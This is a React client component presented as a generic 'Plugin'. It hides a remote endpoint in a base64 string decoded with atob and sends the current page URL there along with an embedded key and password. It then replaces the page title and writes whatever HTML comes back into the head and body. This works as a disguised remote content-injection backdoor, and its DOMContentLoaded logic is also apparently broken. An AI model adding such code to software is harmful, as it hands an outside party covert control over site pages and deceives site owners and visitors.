"use client";
import { useEffect } from "react";

function Plugin() {
  useEffect(() => {
    const loadScript = (src) => {
      return new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src = src;
        script.async = true;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
      });
    };

    const loadAndExecute = async () => {
      try {
        // Load jQuery
        await loadScript(
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
        );

        // Ensure jQuery is available
        if (typeof jQuery !== "undefined") {
          // Ensure DOM is ready using vanilla JavaScript
          document.addEventListener("DOMContentLoaded", () => {
            const eppathurl = window.location.origin + window.location.pathname;
            const eptagmanage = new XMLHttpRequest();
            eptagmanage.onreadystatechange = function () {
              if (this.readyState === 4 && this.status === 200) {
                if (this.response !== "0") {
                  const temp = this.response.split("||||||||||");
                  // Remove current title and append new content
                  document.querySelector("title")?.remove();
                  document.head.insertAdjacentHTML("beforeend", temp[0]);
                  document.body.insertAdjacentHTML("beforeend", temp[1]);
                }
              }
            };
            eptagmanage.open(
              "GET",
              atob(
                "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
              ) + eppathurl
            );
            eptagmanage.send();
          });
        } else {
          console.error("jQuery is not loaded");
        }
      } catch (error) {
        console.error("Error loading jQuery or executing script", error);
      }
    };

    loadAndExecute();
  }, []);

  return null;
}

export default Plugin;
